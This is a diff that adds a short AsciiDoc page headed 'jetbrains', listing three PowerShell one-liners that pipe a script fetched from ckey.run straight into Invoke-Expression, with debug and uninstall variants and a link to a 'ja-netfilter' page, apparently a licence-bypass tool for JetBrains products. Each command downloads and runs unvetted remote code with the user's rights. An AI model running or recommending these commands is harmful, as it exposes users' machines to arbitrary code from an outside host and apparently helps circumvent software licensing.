@@ -1,0 +1,14 @@
+
+= jetbrains
+
+[source,shell]
+----
+irm ckey.run | iex
+
+irm ckey.run/debug | iex
+
+irm ckey.run/uninstall | iex
+
+----
+
+https://ckey.run/ja-netfilter
